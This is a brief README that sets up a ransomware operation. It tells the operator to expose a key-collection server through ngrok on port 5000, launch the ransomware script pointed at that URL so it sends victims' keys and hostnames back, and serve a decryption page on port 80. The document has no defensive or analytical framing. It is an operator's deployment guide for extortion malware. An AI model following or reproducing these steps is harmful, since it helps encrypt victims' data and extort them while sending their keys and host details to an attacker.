# LISTEN. THIS SERVER WILL RUN 2 DIFFERENT SERVICES. 1 ON 80 TO SERVE THE DECRYPTION TOOL AND 1 ON 5000 TO GET THE KEY AND HOSTNAME. 

```
ngrok http 5000
```
Pass the URL to the Ransomware script like this.

```
python3 ransomeware.py <ur beautiful URL>
```
Then place the index.html at var/www/html/
```
cp index.html /var/www/html/index.html
```
Now you can start LightHTTPD on port 80 for this. /n
Then start the server.py.
```
python3 server.py
```
